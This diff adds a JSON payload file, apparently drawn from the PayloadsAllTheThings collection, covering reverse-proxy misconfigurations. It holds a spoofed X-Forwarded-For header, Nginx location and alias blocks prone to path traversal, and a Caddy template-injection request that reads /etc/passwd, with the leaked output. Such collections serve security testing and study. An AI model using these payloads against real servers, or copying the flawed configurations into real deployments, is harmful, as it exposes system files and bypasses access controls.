@@ -1,0 +1,60 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "reverse_proxy_misconfigurations",
+  "original_category": "Reverse Proxy Misconfigurations",
+  "payloads": [
+    {
+      "category": "HTTP Headers",
+      "escalation": "baseline",
+      "lines": [
+        "X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3",
+        "proxy_set_header X-Forwarded-For $remote_addr;"
+      ]
+    },
+    {
+      "category": "Nginx",
+      "escalation": "baseline",
+      "lines": [
+        "server {",
+        "location /app/ {",
+        "# Handles /app/ and anything below, e.g., /app/foo",
+        "}",
+        "location /app {",
+        "# Handles only /app with nothing after OR routes like /application, /appzzz",
+        "}",
+        "}",
+        "location /styles {",
+        "alias /path/css/;",
+        "}",
+        "server {",
+        "root /etc/nginx;",
+        "location /hello.txt {",
+        "try_files $uri $uri/ =404;",
+        "proxy_pass http://127.0.0.1:8080/;",
+        "}",
+        "}"
+      ]
+    },
+    {
+      "category": "Caddy",
+      "escalation": "baseline",
+      "lines": [
+        ":80 {",
+        "root * /",
+        "templates",
+        "respond \"You came from {http.request.header.Referer}\"",
+        "}",
+        "curl -H 'Referer: {{readFile \"etc/passwd\"}}' http://localhost/",
+        "HTTP/1.1 200 OK",
+        "Content-Length: 716",
+        "Content-Type: text/plain; charset=utf-8",
+        "Server: Caddy",
+        "Date: Thu, 24 Jul 2025 08:00:50 GMT",
+        "You came from root:x:0:0:root:/root:/bin/sh",
+        "bin:x:1:1:bin:/bin:/sbin/nologin",
+        "daemon:x:2:2:daemon:/sbin:/sbin/nologin"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.861Z"
+}
